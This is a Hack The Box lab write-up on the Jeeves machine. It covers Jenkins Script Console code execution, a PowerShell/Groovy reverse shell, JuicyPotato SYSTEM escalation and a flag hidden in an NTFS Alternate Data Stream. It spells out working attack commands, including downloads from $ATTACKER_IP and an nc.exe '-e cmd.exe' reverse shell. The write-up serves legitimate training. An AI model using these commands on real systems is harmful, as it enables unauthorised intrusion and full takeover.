Summary
#

Jeeves is a medium-difficulty Hack The Box machine that demonstrates how seemingly minor oversights can lead to full system compromise. The box begins with exploiting a vulnerable Jenkins instance to gain initial access, followed by Windows privilege escalation techniques that culminate in SYSTEM-level control. Its most distinctive learning point is the use of Alternate Data Streams (ADS), a lesser-known NTFS feature that conceals sensitive information from standard file listings. Overall, Jeeves provides valuable exposure to Windows enumeration, privilege escalation, and forensic awareness.

What is Jenkins?

Jenkins is an open-source automation server commonly used for CI/CD pipelines. Administrators can automate software builds, testing, and deployments through Jenkins jobs and plugins.

We can perform Remote Code Execution from a Jenkins application if we can get access to the “Script Console”. Navigating to the “Manage Jenkins” button in the left menu, we see different features from Jenkins one of which is the “Script Console”

Jenkins administrators can execute Groovy scripts through the Script Console. Since these scripts run directly on the Jenkins server, access to this feature effectively provides remote code execution on the underlying operating system.

What is Groovy?

Groovy is a Java-based scripting language used internally by Jenkins. Scripts executed through the Jenkins Script Console run with the permissions of the Jenkins service account and can directly interact with the operating system.

To perform the command “whoami”, we can write following groovy script in the input box and press “Run”:

def cmd = 'whoami'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout

The output showed us that the application is running under the context of user “jeeves\kohsuke”:

After confirming code execution, we can leverage the Script Console to spawn a PowerShell reverse shell and obtain interactive access to the target.

To get a reverse shell, we can generate a payload from https://revshells.com. We will use “PowerShell #3 (Base64)”. Make sure to replace the IP according to your tun0 address and port according to your choosing

Copy the payload and replace in the following reverse shell groovy script:

r = Runtime.getRuntime()
p = r.exec(["cmd.exe","/c","<Reverse-Shell-Payload-Here>"] as String[])
p.waitFor()

Open the netcat listener with:

└─$ rlwrap nc -lvnp <PORT>

As soon as we click the “Run” button, we will receive a reverse shell. We can find the user.txt in “C:\Users\kohsuke\Desktop\user.txt”

The presence of SeImpersonatePrivilege immediately suggests several well-known privilege escalation techniques, including JuicyPotato, RoguePotato, PrintSpoofer, and GodPotato. Since the target is running Windows 10 Pro Build 10586, JuicyPotato is a viable option.

What is JuicyPotato?

JuicyPotato is a Windows privilege escalation tool that abuses COM service activation together with SeImpersonatePrivilege to obtain a SYSTEM access token. It was commonly effective on Windows Server 2008–2016 and Windows 10 builds prior to the mitigations introduced in newer releases.

Exploiting SeImpersonatePrivilege
#

For the exploitation, we need to transfer the compiled binaries of netcat and JuicyPotato.exe to the Windows Target. Open a python server on the attacker machine:

└─$ python3 -m http.server 8090

Download the binaries using the PowerShell cmdlet “Invoke-WebRequest” as curl and wget are not available to us:

C:\Users\kohsuke> powershell.exe -Command "Invoke-WebRequest -Uri http://$ATTACKER_IP:8090/nc.exe -OutFile nc.exe"

C:\Users\kohsuke> powershell.exe -Command "Invoke-WebRequest -Uri http://$ATTACKER_IP:8090/jp.exe -OutFile jp.exe"

NOTE: JuicyPotato can be downloaded from here

Open another netcat listener on our attacker machine to catch the reverse shell returned by the exploit:

└─$ rlwrap nc -lvnp 9091

Run the exploit from the directory where both binaries are present (e.g kohsuke directory in my case) :

C:\Users\kohsuke> jp.exe -l 53375 -p C:\Windows\System32\cmd.exe -a "/c C:\Users\kohsuke\nc.exe $ATTACKER_IP 9091 -e cmd.exe" -t *
ArgumentDescription
jp.exeJuicyPotato executable.
-l 53375Creates a local COM listener on port 53375 used during token impersonation.
-p C:\Windows\System32\cmd.exeProgram to execute after obtaining the privileged token.
-a “/c …”Arguments passed to cmd.exe. The /c flag tells cmd to execute the command and then terminate.
C:\Users\kohsuke\nc.exe $ATTACKER_IP 9091 -e cmd.exeLaunches Netcat and sends a reverse shell to the attacker’s machine.
-t *Tries both CreateProcessWithTokenW and CreateProcessAsUser methods for spawning the process.

What are Alternate Data Streams?

Alternate Data Streams (ADS) are a feature of the NTFS filesystem that allow additional data to be attached to a file without appearing in normal directory listings. ADS are commonly used for metadata storage but can also be abused to conceal malicious files or sensitive information.

Finding Flag in ADS
#

Windows Explorer and a standard dir listing do not display Alternate Data Streams. The /R switch can be used to enumerate any ADS attached to a file.

C:\Users\Administrator\Desktop>dir /R

 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   1,532,428,288 bytes free

And as we saw, the root flag file is present in the ADS of hm.txt. To extract the flag file’s output:

C:\Users\Administrator\Desktop> more < "C:\Users\Administrator\Desktop\hm.txt:root.txt:$DATA"
ComponentDescription
moreWindows command used to display text output one page at a time.
<Input redirection operator. Feeds the contents of a file into the command.
hm.txtThe primary file.
root.txtThe name of the Alternate Data Stream attached to hm.txt.
$DATAThe default NTFS stream type representing the stream’s data.

Key Takeaways

  • Unauthenticated Jenkins instances should always be treated as high-priority findings due to the potential for Script Console abuse.
  • Identifying the Windows build version can significantly influence privilege escalation decisions.
  • SeImpersonatePrivilege remains one of the most valuable privileges for local escalation on older Windows systems.
  • Alternate Data Streams (ADS) are easy to overlook during enumeration and can be used to conceal data from standard file listings.
